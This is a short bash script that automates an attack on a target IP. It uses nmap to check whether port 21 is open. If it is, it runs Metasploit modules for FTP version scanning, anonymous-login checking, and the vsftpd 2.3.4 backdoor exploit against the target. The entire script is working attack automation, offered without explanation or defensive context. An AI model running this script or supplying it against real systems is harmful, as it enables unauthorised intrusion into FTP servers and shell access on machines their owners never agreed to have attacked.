#!/bin/bash

# Check if an IP address is provided as argument
if [ $# -ne 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# Store the target IP address
target="$1"

# Perform Nmap scan to check for open ports
nmap_output=$(nmap -p21 "$target" -oG -)

# Check if port 21 is open
if grep -q "21/open" <<< "$nmap_output"; then
    # If port 21 is open, run FTP exploits
    msfconsole -q -x "use auxiliary/scanner/ftp/ftp_version ; setg RHOSTS \"$target\"; run; back; exit;"
    msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; setg RHOSTS \"$target\"; run; back; exit;"
    msfconsole -q -x "use auxiliary/scanner/ftp/anonymous; setg RHOSTS \"$target\"; run; back; exit;"
else
    echo "Port 21 is not open. Skipping FTP exploits."
fi
